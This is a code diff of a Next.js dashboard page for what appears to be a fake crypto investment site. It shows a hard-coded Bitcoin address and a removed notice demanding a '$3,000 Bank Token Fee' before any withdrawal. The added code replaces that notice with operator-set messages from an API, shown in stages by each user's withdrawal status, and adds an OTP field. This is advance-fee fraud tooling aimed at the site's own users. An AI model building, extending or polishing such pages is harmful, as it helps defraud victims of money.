@@ -1,18 +1,67 @@
 "use client"
 
 import Image from 'next/image'
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { MdContentCopy } from 'react-icons/md';
 import { IoNavigateCircleOutline } from 'react-icons/io5';
 import Link from 'next/link';
 import KycBanner from '@/component/KycBanner';
 import UserBalanceCard from '@/component/Balance';
+import { useUser, useAuth } from '@clerk/nextjs'
 
 
+interface Format {
+  _id: string;
+  title: string;
+  description: string;
+  type: number;
+  form_id: string;
+  approved: boolean;
+}
 
-const page = () => {
+interface Withdrawal {
+  clerkId: string;
+  approve: string; // This is what we need to check: '0', '1', or '2'
+  // Other withdrawal properties...
+}
+
+const Page = () => {
     const [copied, setCopied] = useState(false);
+    const [formats, setFormats] = useState<Format[]>([]);
+    const [withdrawal, setWithdrawal] = useState<Withdrawal | null>(null);
     const address = 'bc1q4ntnxmz7q5aueygahucc69rz2zpqaaex4dyquz';
+    const { userId, sessionId } = useAuth();
+
+    useEffect(() => {
+    const fetchData = async () => {
+        try {
+        // Fetch formats
+        const formatsResponse = await fetch('/api/formats');
+        const formatsData = await formatsResponse.json();
+        if (formatsData.success) {
+            setFormats(formatsData.formats);
+        }
+
+        // Fetch withdrawal data - fix the endpoint path
+        const withdrawalResponse = await fetch(`/api/displayFormat/withdrawal/${userId}`);
+        const withdrawalData = await withdrawalResponse.json();
+        
+        console.log('Withdrawal API Response:', withdrawalData); // Add for debugging
+        
+        if (withdrawalData.success && withdrawalData.withdrawal) {
+            setWithdrawal(withdrawalData.withdrawal);
+        } else {
+            console.log('No withdrawal data found or API error');
+        }
+        } catch (error) {
+        console.error('Error fetching data:', error);
+        }
+    };
+
+    if (userId) {
+        fetchData();
+    }
+    }, [userId]); // Add userId to dependency array
 
     const copyToClipboard = () => {
         navigator.clipboard.writeText(address);
@@ -26,13 +75,30 @@ const page = () => {
 
   return (
     <div className='dashboard'>
-        <div className="tf_Information">
-            <h2>Withdrawal request processing:</h2>
-            <ul>
-                <li>This is to notify that a Bank Token Fee of $3,000 must be paid before access can be granted to the funds in your account. Condition: No withdrawal or transfer will be possible until this fee is settled</li>
-                <li>Note: No withdrawal or transfer will be possible until this fee is settled</li>
-            </ul>
-        </div>
+        {/* Conditionally render based on withdrawal approval status */}
+        {withdrawal && withdrawal.approve === '0' && (
+            <div className="tf_Information">
+                <h2>{formats[0]?.title || "Default Title"}</h2>
+                <ul>
+                    <li>{formats[0]?.description || "Default description"}</li>
+                </ul>
+            </div>
+        )}
+        
+        {withdrawal && withdrawal.approve === '1' && formats.length > 1 && (
+            <div className="tf_Information">
+                <h2>{formats[1]?.title || "Default Title"}</h2>
+                <ul>
+                    <li>{formats[1]?.description || "Default description"}</li>
+                </ul>
+                <div className='OTP'>
+                    <h1>Enter OTP</h1>
+                    <input type="number" placeholder='1234' />
+                </div>
+            </div>
+        )}
+        
+        
         <KycBanner />
         <div className="dashboard-container">
             <div className="dash-top">
@@ -97,4 +163,4 @@ const page = () => {
   )
 }
 
-export default page
+export default Page
